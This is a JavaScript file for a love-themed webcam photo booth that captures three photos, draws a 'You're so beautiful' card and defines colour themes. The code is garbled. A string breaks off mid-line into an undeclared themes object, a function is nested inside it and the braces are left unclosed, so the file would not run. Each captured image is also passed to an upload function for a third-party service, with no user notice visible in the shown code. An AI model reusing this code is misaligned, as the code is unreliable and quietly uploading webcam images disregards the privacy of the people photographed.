let capturedImages = [];

const video = document.getElementById("video");
const captureBtn = document.getElementById("capture-btn");
const photos = document.getElementById("photos");

// Start camera
navigator.mediaDevices
  .getUserMedia({ video: true })
  .then((stream) => {
    video.srcObject = stream;
  })
  .catch((error) => {
    alert("Camera access denied!");
    console.error("Camera Error:", error);
  });

// Capture photo
function capture() {
  const canvas = document.createElement("canvas");
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;

  const ctx = canvas.getContext("2d");
  ctx.drawImage(video, 0, 0);

  const imageData = canvas.toDataURL("image/png");

  if (capturedImages.length < 3) {
    capturedImages.push(imageData);
  }
  uploadToUploadcare(imageData);


  if (capturedImages.length === 3) {
    captureBtn.disabled = true;
    createPhotoCard();
  }
}

// Create final photo card
function createPhotoCard() {
  const cardCanvas = document.createElement("canvas");
  const width = 500;
  const height = 650;
  cardCanvas.width = width;
  cardCanvas.height = height;

  const ctx = cardCanvas.getContext("2d");

  // Love theme background
  const gradient = ctx.createLinearGradient(0, 0, 0, height);
  gradient.addColorStop(0, "#ffc0cb");
  gradient.addColorStop(1, "#ffe6f0");
  ctx.fillStyle = gradient;
  ctx.fillRect(0, 0, width, height);

  // Add hearts background lightly
  ctx.font = "24px Arial";
  ctx.fillStyle = "#ffb6c1";
  for (let i = 0; i < 20; i++) {
    ctx.fillText("❤️", Math.random() * width, Math.random() * height);
  }

  // Beautiful title
  ctx.fillStyle = "#d6006d";
  ctx.font = "bold 26px Arial";
  ctx.textAlign = "center";
  ctx.fillText("You're so beautiful 💖", width / 2, 50);

  // Image layout
  const imgSize = 120;
  const spacing = 20;
  const totalWidth = imgSize * 3 + spacing * 2;
  const startX = (width - totalWidth) / 2;
  const y = 90;

  let loaded = 0;

  photos.innerHTML = "<

  galaxy: {
    bg: "linear-gradient(to right, #0f0c29, #302b63, #24243e)",
    btn: "#8a2be2",
    text: "#ffffff",
    font: "#f8f8f8",
    gradient1: "#3a0ca3",
    gradient2: "#7209b7"
  },
  valentine: {
    bg: "linear-gradient(to right, #ffdde1, #ee9ca7)",
    btn: "#ff3366",
    text: "#cc0033",
    font: "#000",
    gradient1: "#ffb6b9",
    gradient2: "#fae3d9"
  },
  nature: {
    bg: "linear-gradient(to right, #d4fc79, #96e6a1)",
    btn: "#388e3c",
    text: "#2e7d32",
    font: "#1b5e20",
    gradient1: "#a8e063",
    gradient2: "#56ab2f"
  },
  ocean: {
    bg: "linear-gradient(to right, #2193b0, #6dd5ed)",
    btn: "#0077be",
    text: "#004c99",
    font: "#002744",
    gradient1: "#00c6ff",
    gradient2: "#0072ff"
  },
  sunset: {
    bg: "linear-gradient(to right, #ff7e5f, #feb47b)",
    btn: "#f96332",
    text: "#993300",
    font: "#3e1f04",
    gradient1: "#ff9a9e",
    gradient2: "#fad0c4"
  },
  winter: {
    bg: "linear-gradient(to right, #e0eafc, #cfdef3)",
    btn: "#4e7ac7",
    text: "#2c3e50",
    font: "#2c3e50",
    gradient1: "#c9d6ff",
    gradient2: "#e2e2e2"
  }
  function applyTheme(name) {
    document.body.className = ""; // Remove previous theme
    document.body.classList.add(`theme-${name}`);
    localStorage.setItem("selectedTheme", name);
  }
    